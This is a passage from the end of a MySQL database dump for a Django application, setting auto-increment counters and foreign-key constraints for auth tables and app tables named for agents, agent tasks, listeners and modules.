  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `blog_agenttasks`
--
ALTER TABLE `blog_agenttasks`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=266;

--
-- AUTO_INCREMENT for table `blog_listenerform`
--
ALTER TABLE `blog_listenerform`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `blog_modules`
--
ALTER TABLE `blog_modules`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=123;

--
-- AUTO_INCREMENT for table `django_admin_log`
--
ALTER TABLE `django_admin_log`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=194;

--
-- AUTO_INCREMENT for table `django_content_type`
--
ALTER TABLE `django_content_type`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `django_migrations`
--
ALTER TABLE `django_migrations`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `auth_group_permissions`
--
ALTER TABLE `auth_group_permissions`
  ADD CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  ADD CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`);

--
-- Constraints for table `auth_permission`
--
ALTER TABLE `auth_permission`
  ADD CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`);

--
-- Constraints for table `auth_user_groups`
--
ALTER TABLE `auth_user_groups`
  ADD CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  ADD CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`);

--
-- Constraints for table `auth_user_user_permissions`
--
ALTER TABLE `auth_user_user_permissions`
  ADD CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  ADD CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`);

--
-- Constraints for table `blog_agenttasks`
--
ALTER TABLE `blog_agenttasks`
  ADD CONSTRAINT `blog_agenttasks_agent_id_83bb1206_fk_blog_agent_id` FOREIGN KEY (`agent_id`) REFERENCES `blog_agent` (`id`),
  ADD CONSTRAINT `blog_agenttasks_module_id_c7795aab_fk_blog_modules_id` FOREIGN KEY (`module_id`) REFERENCES `blog_modules` (`id`),
  ADD CONSTRAINT `blog_agenttasks_user_id_dfec30b6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`);

--
-- Constraints for table `django_admin_log`
--
ALTER TABLE `django_admin_log`
  ADD CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  ADD CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
